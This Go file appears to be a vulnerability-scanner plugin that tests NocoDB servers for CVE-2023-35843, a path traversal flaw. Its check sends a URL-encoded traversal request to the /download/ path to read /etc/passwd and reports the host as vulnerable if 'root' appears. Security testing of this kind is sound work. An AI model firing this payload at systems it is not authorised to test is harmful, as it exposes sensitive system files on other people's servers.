// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("NocoDB_cve_2023_35843", &NocoDB_cve_2023_35843{})
}

type NocoDB_cve_2023_35843 struct{}

func (p *NocoDB_cve_2023_35843) Info() PluginInfo {
	return PluginInfo{
		Name:     "NocoDB 任意文件读取漏洞（CVE-2023-35843）",
		VulnInfo: "NocoDB是Airtable的开源替代品,将 MySQL、PostgreSQL、SQL Server、SQLite 或 MariaDB 转换为智能电子表格。CVE-2023-35843 中，攻击者可构造恶意请求，遍历读取系统上的文件，造成敏感信息泄漏。",
		VulnID:   "CVE-2023-35843",
		Level:    "7.5 HIGH",
		URL:      "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-35843",
		Version:  "NocoDB <= 0.106.1",
		CWE:      "CWE-22	路径遍历",
	}
}

func (p *NocoDB_cve_2023_35843) Check(netloc string) bool {
	req0, err := http.NewRequest("GET", netloc, nil)
	if err != nil {
		return false
	}
	resp0, err := utils.RequestDo(req0, true, 5)
	if err != nil {
		return false
	}
	// fmt.Println(resp0.ResponseRaw)
	if resp0.Other.StatusCode == 200 {
		fmt.Println("[*] Connect to NocoDB")

		checkURL := netloc + "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
		checkReq, err := http.NewRequest("GET", checkURL, nil)
		if err != nil {
			return false
		}
		checkResp, err := utils.RequestDo(checkReq, true, 2)
		if err != nil {
			return false
		}

		// fmt.Println(checkResp.ResponseRaw)
		if checkResp.Other.StatusCode == 200 && strings.Contains(checkResp.ResponseRaw, "root") {
			return true
		}
	}

	return false
}
